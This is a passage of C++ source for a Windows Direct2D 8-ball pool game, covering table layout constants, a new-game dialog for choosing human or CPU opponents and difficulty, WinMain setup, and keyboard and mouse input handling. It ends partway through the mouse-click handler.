D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

// Corrected Pocket Center Positions (aligned with table corners/edges)
const D2D1_POINT_2F pocketPositions[6] = {
    {TABLE_LEFT, TABLE_TOP},                           // Top-Left
    {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
    {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
    {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
    {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
    {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
};

// Colors
const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green
const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Yellow); // Solids = Yellow
const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::Red);   // Stripes = Red
const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

// --- Forward Declarations ---
HRESULT CreateDeviceResources();
void DiscardDeviceResources();
void OnPaint();
void OnResize(UINT width, UINT height);
void InitGame();
void GameUpdate();
void UpdatePhysics();
void CheckCollisions();
bool CheckPockets(); // Returns true if any ball was pocketed
void ProcessShotResults();
void ApplyShot(float power, float angle, float spinX, float spinY);
void RespawnCueBall(bool behindHeadstring);
bool AreBallsMoving();
void SwitchTurns();
void AssignPlayerBallTypes(BallType firstPocketedType);
void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
Ball* GetBallById(int id);
Ball* GetCueBall();

// Drawing Functions
void DrawScene(ID2D1RenderTarget* pRT);
void DrawTable(ID2D1RenderTarget* pRT);
void DrawBalls(ID2D1RenderTarget* pRT);
void DrawCueStick(ID2D1RenderTarget* pRT);
void DrawAimingAids(ID2D1RenderTarget* pRT);
void DrawUI(ID2D1RenderTarget* pRT);
void DrawPowerMeter(ID2D1RenderTarget* pRT);
void DrawSpinIndicator(ID2D1RenderTarget* pRT);
void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);

// Helper Functions
float GetDistance(float x1, float y1, float x2, float y2);
float GetDistanceSq(float x1, float y1, float x2, float y2);
bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
template <typename T> void SafeRelease(T** ppT);
// --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
// --- End Forward Declaration ---
bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

// --- NEW Forward Declarations ---

// AI Related
struct AIShotInfo; // Define below
void TriggerAIMove();
void AIMakeDecision();
void AIPlaceCueBall();
AIShotInfo AIFindBestShot();
AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
bool IsValidAIAimAngle(float angle); // Basic check

// Dialog Related
INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void ShowNewGameDialog(HINSTANCE hInstance);
void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

// --- Forward Declaration for Window Procedure --- <<< Add this line HERE
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

// --- NEW Struct for AI Shot Evaluation ---
struct AIShotInfo {
    bool possible = false;          // Is this shot considered viable?
    Ball* targetBall = nullptr;     // Which ball to hit
    int pocketIndex = -1;           // Which pocket to aim for (0-5)
    D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
    float angle = 0.0f;             // Calculated shot angle
    float power = 0.0f;             // Calculated shot power
    float score = -1.0f;            // Score for this shot (higher is better)
    bool involves8Ball = false;     // Is the target the 8-ball?
};

// --- NEW Dialog Procedure ---
INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
    {
        // --- ACTION 4: Center Dialog Box ---
// Optional: Force centering if default isn't working
        RECT rcDlg, rcOwner, rcScreen;
        HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
        if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

        GetWindowRect(hwndOwner, &rcOwner);
        GetWindowRect(hDlg, &rcDlg);
        CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

        // Offset the owner rect relative to the screen if it's not the desktop
        if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
            OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
            OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
            OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
        }


        // Calculate centered position
        int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
        int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

        // Ensure it stays within screen bounds (optional safety)
        x = std::max(static_cast<int>(rcScreen.left), x);
        y = std::max(static_cast<int>(rcScreen.top), y);
        if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
            x = rcScreen.right - (rcDlg.right - rcDlg.left);
        if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
            y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


        // Set the dialog position
        SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

        // --- End Centering Code ---

        // Set initial state based on current global settings (or defaults)
        CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

        CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
            (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

        // Enable/Disable AI group based on initial mode
        EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
        EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
    }
    return (INT_PTR)TRUE;

    case WM_COMMAND:
        switch (LOWORD(wParam)) {
        case IDC_RADIO_2P:
        case IDC_RADIO_CPU:
        {
            bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
            // Enable/Disable AI group controls based on selection
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
        }
        return (INT_PTR)TRUE;

        case IDOK:
            // Retrieve selected options and store in global variables
            if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                gameMode = HUMAN_VS_AI;
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;
            }
            else {
                gameMode = HUMAN_VS_HUMAN;
            }
            EndDialog(hDlg, IDOK); // Close dialog, return IDOK
            return (INT_PTR)TRUE;

        case IDCANCEL: // Handle Cancel or closing the dialog
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break; // End WM_COMMAND
    }
    return (INT_PTR)FALSE; // Default processing
}

// --- NEW Helper to Show Dialog ---
void ShowNewGameDialog(HINSTANCE hInstance) {
    if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
        // User clicked Start, reset game with new settings
        isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""CPU (Easy)""; break;
            case MEDIUM: player2Info.name = L""CPU (Medium)""; break;
            case HARD: player2Info.name = L""CPU (Hard)""; break;
            }
        }
        else {
            player2Info.name = L""Player 2"";
        }
        // Update window title
        std::wstring windowTitle = L""Direct2D 8-Ball Pool"";
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
        SetWindowText(hwndMain, windowTitle.c_str());

        InitGame(); // Re-initialize game logic & board
        InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
    }
    else {
        // User cancelled dialog - maybe just resume game? Or exit?
        // For simplicity, we do nothing, game continues as it was.
        // To exit on cancel from F2, would need more complex state management.
    }
}

// --- NEW Reset Game Function ---
void ResetGame(HINSTANCE hInstance) {
    // Call the helper function to show the dialog and re-init if OK clicked
    ShowNewGameDialog(hInstance);
}

// --- WinMain ---
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
    if (FAILED(CoInitialize(NULL))) {
        MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
        return -1;
    }

    // --- NEW: Show configuration dialog FIRST ---
    if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
        // User cancelled the dialog
        CoUninitialize();
        return 0; // Exit gracefully if dialog cancelled
    }
    // Global gameMode and aiDifficulty are now set by the DialogProc

    // Set AI flag based on game mode
    isPlayer2AI = (gameMode == HUMAN_VS_AI);
    if (isPlayer2AI) {
        switch (aiDifficulty) {
        case EASY: player2Info.name = L""CPU (Easy)""; break;
        case MEDIUM: player2Info.name = L""CPU (Medium)""; break;
        case HARD: player2Info.name = L""CPU (Hard)""; break;
        }
    }
    else {
        player2Info.name = L""Player 2"";
    }
    // --- End of Dialog Logic ---


    WNDCLASS wc = { };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L""Direct2D_8BallPool"";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

    if (!RegisterClass(&wc)) {
        MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
        CoUninitialize();
        return -1;
    }

    // --- ACTION 4: Calculate Centered Window Position ---
    const int WINDOW_WIDTH = 1000; // Define desired width
    const int WINDOW_HEIGHT = 700; // Define desired height
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WINDOW_WIDTH) / 2;
    int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

    // --- Change Window Title based on mode ---
    std::wstring windowTitle = L""Direct2D 8-Ball Pool"";
    if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
    else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

    DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

    hwndMain = CreateWindowEx(
        0, L""Direct2D_8BallPool"", windowTitle.c_str(), dwStyle,
        windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL
    );

    if (!hwndMain) {
        MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
        CoUninitialize();
        return -1;
    }

    // Initialize Direct2D Resources AFTER window creation
    if (FAILED(CreateDeviceResources())) {
        MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
        DestroyWindow(hwndMain);
        CoUninitialize();
        return -1;
    }

    InitGame(); // Initialize game state AFTER resources are ready & mode is set

    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);

    if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
        MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
        DestroyWindow(hwndMain);
        CoUninitialize();
        return -1;
    }

    MSG msg = { };
    // --- Modified Main Loop ---
    // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
    // or gets reset to it via F2. The main loop runs normally once game starts.
    while (GetMessage(&msg, NULL, 0, 0)) {
        // We might need modeless dialog handling here if F2 shows dialog
        // while window is active, but DialogBoxParam is modal.
        // Let's assume F2 hides main window, shows dialog, then restarts game loop.
        // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    KillTimer(hwndMain, ID_TIMER);
    DiscardDeviceResources();
    CoUninitialize();

    return (int)msg.wParam;
}

// --- WndProc ---
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    // Declare cueBall pointer once at the top, used in multiple cases
    // For clarity, often better to declare within each case where needed.
    Ball* cueBall = nullptr; // Initialize to nullptr
    switch (msg) {
    case WM_CREATE:
        // Resources are now created in WinMain after CreateWindowEx
        return 0;

    case WM_PAINT:
        OnPaint();
        // Validate the entire window region after painting
        ValidateRect(hwnd, NULL);
        return 0;

    case WM_SIZE: {
        UINT width = LOWORD(lParam);
        UINT height = HIWORD(lParam);
        OnResize(width, height);
        return 0;
    }

    case WM_TIMER:
        if (wParam == ID_TIMER) {
            GameUpdate(); // Update game logic and physics
            InvalidateRect(hwnd, NULL, FALSE); // Request redraw
        }
        return 0;

        // --- NEW: Handle F2 Key for Reset ---
        // --- MODIFIED: Handle More Keys ---
    case WM_KEYDOWN:
    { // Add scope for variable declarations

        // --- FIX: Get Cue Ball pointer for this scope ---
        cueBall = GetCueBall();
        // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
        // --- End Fix ---

        // Check which player can interact via keyboard (Humans only)
        bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
            (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

        // --- F1 / F2 Keys (Always available) ---
        if (wParam == VK_F2) {
            HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
            ResetGame(hInstance); // Call reset function
            return 0; // Indicate key was processed
        }
        else if (wParam == VK_F1) {
            MessageBox(hwnd,
                L""Direct2D-based StickPool game made in C++ from scratch (2764+ lines of code)\n"" // Update line count if needed
                L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                L""About This Game"", MB_OK | MB_ICONINFORMATION);
            return 0; // Indicate key was processed
        }

        // --- Player Interaction Keys (Only if allowed) ---
        if (canPlayerControl) {
            // --- Get Shift Key State ---
            bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
            float powerStep = 0.2f; // Power step (Adjust as needed)

            switch (wParam) {
            case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                    cueAngle -= angleStep;
                    // Normalize angle (keep between 0 and 2*PI)
                    if (cueAngle < 0) cueAngle += 2 * PI;
                    // Ensure state shows aiming visuals if turn just started
                    if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                    isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                    isDraggingStick = false;
                    keyboardAimingActive = true;
                }
                break;

            case VK_RIGHT: // Rotate Cue Stick Clockwise
                if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                    cueAngle += angleStep;
                    // Normalize angle (keep between 0 and 2*PI)
                    if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                    // Ensure state shows aiming visuals if turn just started
                    if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                    isAiming = false;
                    isDraggingStick = false;
                    keyboardAimingActive = true;
                }
                break;

            case VK_UP: // Decrease Shot Power
                if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                    shotPower -= powerStep;
                    if (shotPower < 0.0f) shotPower = 0.0f;
                    // Ensure state shows aiming visuals if turn just started
                    if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                    isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                    isDraggingStick = false;
                    keyboardAimingActive = true;
                }
                break;

            case VK_DOWN: // Increase Shot Power
                if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                    shotPower += powerStep;
                    if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                    // Ensure state shows aiming visuals if turn just started
                    if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                    isAiming = true;
                    isDraggingStick = false;
                    keyboardAimingActive = true;
                }
                break;

            case VK_SPACE: // Trigger Shot
                if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                    && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                {
                    if (shotPower > 0.15f) { // Use same threshold as mouse
                       // Reset foul flags BEFORE applying shot
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;

                        // Play sound & Apply Shot
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                        // Update State
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false;
                        pocketedThisTurn.clear();
                        shotPower = 0; // Reset power after shooting
                        isAiming = false; isDraggingStick = false; // Reset aiming flags
                        keyboardAimingActive = false;
                    }
                }
                break;

            case VK_ESCAPE: // Cancel Aim/Shot Setup
                if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                {
                    shotPower = 0.0f;
                    isAiming = false;
                    isDraggingStick = false;
                    keyboardAimingActive = false;
                    // Revert to basic turn state if not breaking
                    if (currentGameState != BREAKING) {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    }
                }
                break;

            case 'G': // Toggle Cheat Mode
                cheatModeEnabled = !cheatModeEnabled;
                if (cheatModeEnabled)
                    MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                else
                    MessageBeep(MB_OK); // Play a different beep when disabling
                break;

            default:
                // Allow default processing for other keys if needed
                // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
                break;
            } // End switch(wParam) for player controls
            return 0; // Indicate player control key was processed
        } // End if(canPlayerControl)
    } // End scope for WM_KEYDOWN case
    // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
    // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
    return 0;

    case WM_MOUSEMOVE: {
        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        cueBall = GetCueBall(); // Declare and get cueBall pointer

        if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
            Ball* ball = GetBallById(draggingBallId);
            if (ball) {
                ball->x = (float)ptMouse.x;
                ball->y = (float)ptMouse.y;
                ball->vx = ball->vy = 0.0f;
            }
            return 0;
        }

        if (!cueBall) return 0;

        // Update Aiming Logic (Check player turn)
        if (isDraggingCueBall &&
            ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                currentGameState == PRE_BREAK_PLACEMENT))
        {
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            // Tentative position update
            cueBall->x = (float)ptMouse.x;
            cueBall->y = (float)ptMouse.y;
            cueBall->vx = cueBall->vy = 0;
        }
        else if ((isAiming || isDraggingStick) &&
            ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
        {
            //NEW2 MOUSEBOUND CODE = START
                /*// Clamp mouse inside table bounds during aiming
                if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
            if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
            if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
            if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
            //NEW2 MOUSEBOUND CODE = END
            // Aiming drag updates angle and power
            float dx = (float)ptMouse.x - cueBall->x;
            float dy = (float)ptMouse.y - cueBall->y;
            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
            //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
            //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
            if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
            }
        }
        else if (isSettingEnglish &&
            ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
        {
            // Setting English
            float dx = (float)ptMouse.x - spinIndicatorCenter.x;
            float dy = (float)ptMouse.y - spinIndicatorCenter.y;
            float dist = GetDistance(dx, dy, 0, 0);
            if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
            cueSpinX = dx / spinIndicatorRadius;
            cueSpinY = dy / spinIndicatorRadius;
        }
        else {
            //DISABLE PERM AIMING = START
            /*// Update visual angle even when not aiming/dragging (Check player turn)
            bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

            if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
            {
                // NEW MOUSEBOUND CODE = START
                    // Only update cue angle if mouse is inside the playable table area
                if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                    ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                {
                    // NEW MOUSEBOUND CODE = END
                    Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                    if (cb) {
                        float dx = (float)ptMouse.x - cb->x;
                        float dy = (float)ptMouse.y - cb->y;
                        if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    }
                } //NEW MOUSEBOUND CODE LINE = DISABLE
            }*/
            //DISABLE PERM AIMING = END
        }
        return 0;
    } // End WM_MOUSEMOVE

    case WM_LBUTTONDOWN: {
        ptMouse.x = LOWORD(lParam);
        ptMouse.y = HIWORD(lParam);

        if (cheatModeEnabled) {
            // Allow dragging any ball freely
            for (Ball& ball : balls) {
                float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                    isDraggingCueBall = true;
                    draggingBallId = ball.id;
                    if (ball.id == 0) {
                        // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                        if (currentPlayer == 1)
                            currentGameState = BALL_IN_HAND_P1;
                        else if (currentPlayer == 2 && !isPlayer2AI)
                            currentGameState = BALL_IN_HAND_P2;
                    }
                    return 0;
                }
            }
        }

        Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

        // Check which player is allowed to interact via mouse click
        bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
        // Define states where interaction is generally allowed
        bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
            currentGameState == AIMING || currentGameState == BREAKING ||
            currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
            currentGameState == PRE_BREAK_PLACEMENT);

        // Check Spin Indicator first (Allow if player's turn/aim phase)
        if (canPlayerClickInteract && canInteractState) {
            float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
            if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                isSettingEnglish = true;
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
                isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                return 0;
            }
        }

        if (!cueBall) return 0;

        // Check Ball-in-Hand placement/drag
        bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
        bool isPlayerAllowedToPlace = (isPlacingBall &&
            ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

        if (isPlayerAllowedToPlace) {
            float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
            if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                isDraggingCueBall = true;
                isAiming = false; isDraggingStick = false;
            }
            else {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                    cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                    cueBall->vx = 0; cueBall->vy = 0;
                    isDraggingCueBall = false;
                    // Transition state
                    if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
